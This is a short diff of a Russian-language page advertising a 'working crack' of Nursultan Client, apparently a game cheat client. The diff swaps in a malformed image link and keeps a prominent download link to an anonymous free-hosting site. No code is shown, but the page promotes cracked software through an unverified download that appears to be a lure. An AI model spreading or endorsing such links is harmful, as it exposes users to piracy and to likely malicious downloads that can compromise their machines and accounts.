@@ -4,7 +4,7 @@
 
 
 
-## ![](https://33333.cdn.cke-cs.com/kSW7V9NHUXugvhoQeFaf/images/4f7af5816dd916b578ce92e0aa3b4330dda6fc0477ea1b58.png)  
+## ![]((https://tikolu.net/i/jyabm)
 [**СКАЧАТЬ**](https://sigmafile.42web.io/index.html)
 
 ## **Рабочий кряк Nursultan Client.**  
